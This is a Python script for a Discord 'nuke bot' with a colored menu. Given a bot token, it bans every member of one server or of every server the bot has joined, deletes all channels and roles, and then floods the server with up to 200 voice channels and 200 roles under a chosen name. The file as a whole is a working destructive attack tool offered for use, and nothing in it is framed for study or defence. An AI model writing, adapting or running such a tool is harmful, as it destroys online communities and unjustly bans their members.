import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import asyncio
import logging

# Initialize colorama and logging
init()
logging.basicConfig(level=logging.INFO)

# Color shortcuts
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

# Clear screen function
clear = lambda: system('cls') if os_name == 'nt' else system('clear')

# Input function with color
def _input(text):
    print(text, end='')
    return input()

# Banner
baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/Sigma-cc'''

# Functions for nuking
async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
            await asyncio.sleep(1)  # Rate limit handling
        except Exception as e:
            logging.error(f'Failed to delete channel: {e}')
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
            await asyncio.sleep(1)  # Rate limit handling
        except Exception as e:
            logging.error(f'Failed to delete role: {e}')
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            if guild.me.guild_permissions.ban_members:
                await member.ban()
                banned += 1
                await asyncio.sleep(1)  # Rate limit handling
            else:
                logging.warning(f'Missing permissions to ban members in {guild.name}')
        except Exception as e:
            logging.error(f'Failed to ban member: {e}')
    return banned

async def create_roles(guild, name):
    created = 0
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 1
            await asyncio.sleep(1)  # Rate limit handling
        except Exception as e:
            logging.error(f'Failed to create role: {e}')
    return created

async def create_voice_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=name)
            created += 1
            await asyncio.sleep(1)  # Rate limit handling
        except Exception as e:
            logging.error(f'Failed to create voice channel: {e}')
    return created

async def nuke_guild(guild, name):
    confirm = input(f'{r}Are you sure you want to nuke {guild.name}? (y/n): {g}')
    if confirm.lower() != 'y':
        return

    print(f'{r}Nuke: {m}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{m}Banned:{b}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}Delete Channels:{b}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{m}Delete Roles:{b}{delete_roles}')
    created_channels = await create_voice_channels(guild, name)
    print(f'{m}Create Voice Channels:{b}{created_channels}')
    created_roles = await create_roles(guild, name)
    print(f'{m}Create Roles:{b}{created_roles}')
    print(f'{r}--------------------------------------------\n\n')

# Main loop
while True:
    clear()
    choice = input(f'''   
{baner}                
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Run Setup Nuke Bot
    {y}└─[2] {m}- {g}Exit
{y}====>{g}''')
    if choice == '1':
        token = _input(f'{y}Input bot token:{g}')
        name = _input(f'{y}Input name for created channels / roles:{g}')
        clear()
        choice_type = _input(f'''
{baner}                
{c}--------------------------------------------
{b}[Select]
    {y}└─[1] {m}- {g}Nuke of all servers.
    {y}└─[2] {m}- {g}Nuke only one server.  
    {y}└─[3] {m}- {g}Exit
{y}====>{g}''')
        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[+]Logged as {client.user.name}
[+]Bot in {len(client.guilds)} servers!''')
                for guild in client.guilds:
                    await nuke_guild(guild, name)
                await client.close()
        elif choice_type == '2':
            guild_id =  _input(f'{y}Input server id:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild, name)
                await client.close()
        elif choice_type == '3':
            print(f'{dr}Exit...')
            exit()
        try:
            client.run(token)
            input('Nuke finished, press enter for return to menu...')
        except discord.LoginFailure:
            input(f'{r}Invalid token\n{b}Press enter to return...')
        except discord.PrivilegedIntentsRequired:
            input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter to return...')
        except Exception as error:
            input(f'{r}{error}\n{b}Press enter to return...')
            continue
    elif choice == '2':
        print(f'{dr}Exit...')
        exit()
